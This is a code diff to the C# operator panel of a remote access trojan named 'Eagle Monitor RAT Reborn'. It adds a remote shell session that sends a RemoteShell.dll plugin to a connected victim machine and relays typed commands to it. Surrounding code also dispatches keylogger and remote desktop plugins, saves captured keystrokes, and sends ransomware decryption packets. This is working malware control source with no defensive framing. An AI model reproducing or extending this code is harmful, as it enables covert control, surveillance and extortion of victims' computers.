@@ -12,6 +12,7 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 
 /* 
@@ -29,6 +30,7 @@ namespace Eagle_Monitor_RAT_Reborn
         internal RemoteMicrophoneHandler remoteMicrophoneHandler { get; set; }
         internal KeyloggerHandler keyloggerHandler { get; set; }
         internal ChatHandler chatHandler { get; set; }
+        internal RemoteShellHandler remoteShellHandler { get; set; }
 
         internal long downloadFileTicket { get; set; }
         internal Dictionary<long, DataGridViewRow> downloadList { get; set; }
@@ -48,7 +50,6 @@ namespace Eagle_Monitor_RAT_Reborn
 
             if (this.clientHandler.isAdmin)
                 this.askUACGuna2Button.Enabled = false;
-
         }
 
         private void ClientForm_Load(object sender, EventArgs e)
@@ -108,6 +109,7 @@ namespace Eagle_Monitor_RAT_Reborn
             tabImageList.Images.Add(Properties.Resources.icons8_control_panel);
             tabImageList.Images.Add(Properties.Resources.icons8_microsoft_admin);
             tabImageList.Images.Add(Properties.Resources.icons8_security_document);
+            tabImageList.Images.Add(Properties.Resources.icons8_command_line);
 
             this.mainGuna2TabControl.ImageList = tabImageList;
             this.tabPage1.ImageIndex = 0;
@@ -117,6 +119,7 @@ namespace Eagle_Monitor_RAT_Reborn
             this.tabPage14.ImageIndex = 4;
             this.tabPage24.ImageIndex = 5;
             this.tabPage25.ImageIndex = 6;
+            this.tabPage29.ImageIndex = 7;
 
             ImageList recoveryTabList = new ImageList
             {
@@ -312,7 +315,7 @@ namespace Eagle_Monitor_RAT_Reborn
 
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                 {
-                    baseIp = this.remoteDesktopHandler.baseIp,
+                    baseIp = this.clientHandler.IP,
                     HWID = this.clientHandler.HWID
                 };
                 this.remoteDesktopHandler.clientHandler.SendPacket(remoteViewerPacket);
@@ -340,8 +343,11 @@ namespace Eagle_Monitor_RAT_Reborn
 
             if (this.keyloggerHandler != null)
             {
-                KeylogPacket keylogPacket = new KeylogPacket(this.clientHandler.IP, this.clientHandler.HWID);
-                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1);
+                KeylogPacket keylogPacket = new KeylogPacket(this.clientHandler.IP, this.clientHandler.HWID) 
+                {
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
+                };
+
                 this.keyloggerHandler.clientHandler.SendPacket(keylogPacket);
                 this.keyloggerGuna2Button.Text = "Start";
                 File.WriteAllText(this.clientHandler.clientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", this.keystrokeRichTextBox.Text);
@@ -353,6 +359,17 @@ namespace Eagle_Monitor_RAT_Reborn
                 chatPacket.baseIp = this.clientHandler.IP;
                 this.chatHandler.clientHandler.SendPacket(chatPacket);
                 this.chatGuna2Button.Text = "Start";
+            }
+  
+            if (this.remoteShellHandler != null)
+            {
+                StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
+                {
+                    baseIp = this.clientHandler.IP,
+                    HWID = this.clientHandler.HWID
+                };
+                this.remoteShellHandler.clientHandler.SendPacket(stopShellSessionPacket);
+                this.remoteShellGuna2Button.Text = "Start Session";
             }
         }
 
@@ -795,6 +812,7 @@ namespace Eagle_Monitor_RAT_Reborn
                 {
                     plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                     baseIp = this.clientHandler.IP,
+                    HWID = this.clientHandler.HWID,
                     width = remoteDesktopPictureBox.Width,
                     height = remoteDesktopPictureBox.Height,
                     format = "JPEG",
@@ -1776,7 +1794,69 @@ namespace Eagle_Monitor_RAT_Reborn
             this.clientHandler.SendPacket(ransomwareDecryptionPacket);
         }
         #endregion
+        #region "Shell"
+        private void remoteShellGuna2Button_Click(object sender, EventArgs e)
+        {
+            if (this.remoteShellGuna2Button.Text == "Start Session")
+            {
+                this.remoteShellHandler = new RemoteShellHandler();
+                StartShellSessionPacket startShellSessionPacket = new StartShellSessionPacket(remoteShellGuna2ToggleSwitch.Checked)
+                {
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteShell.dll"), 1)
+                };
+                this.clientHandler.SendPacket(startShellSessionPacket);
+                this.remoteShellGuna2Button.Text = "Stop Session";
+            }
+            else 
+            {
+                if (clientHandler != null)
+                {
+                    StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
+                    {
+                        baseIp = this.clientHandler.IP,
+                        HWID = this.clientHandler.HWID
+                    };
+                    this.remoteShellHandler.clientHandler.SendPacket(stopShellSessionPacket);
 
+                    this.remoteShellGuna2ToggleSwitch.Enabled = true;
+                    this.remoteShellGuna2TextBox.Enabled = false;
+                }
+                this.remoteShellGuna2Button.Text = "Start Session";
+            }
+        }
+
+        private void remoteShellGuna2TextBox_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(this.remoteShellGuna2TextBox.Text.Trim()))
+            {
+                string input = this.remoteShellGuna2TextBox.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
+                this.remoteShellGuna2TextBox.Text = string.Empty;
+
+                switch (input)
+                {
+                    case "cls":
+                        this.remoteShellStdOutRichTextBox.Text = string.Empty;
+                        break;
+                    default:
+                        NewCommandShellSessionPacket newCommandShellSessionPacket = new NewCommandShellSessionPacket(input)
+                        {
+                            baseIp = this.clientHandler.IP,
+                            HWID = this.clientHandler.HWID
+                        };
+                        this.remoteShellHandler.clientHandler.SendPacket(newCommandShellSessionPacket);
+                        break;
+                }
+
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+            }
+        }
+
+        private void remoteShellStdOutRichTextBox_TextChanged(object sender, EventArgs e)
+        {
+            Misc.Imports.SendMessage(this.remoteShellStdOutRichTextBox.Handle, Misc.Imports.WM_VSCROLL, Misc.Imports.SB_PAGEBOTTOM, IntPtr.Zero);
+        }
+        #endregion
         private void mainGuna2TabControl_SelectedIndexChanged(object sender, EventArgs e)
         {
             switch (mainGuna2TabControl.SelectedIndex) 
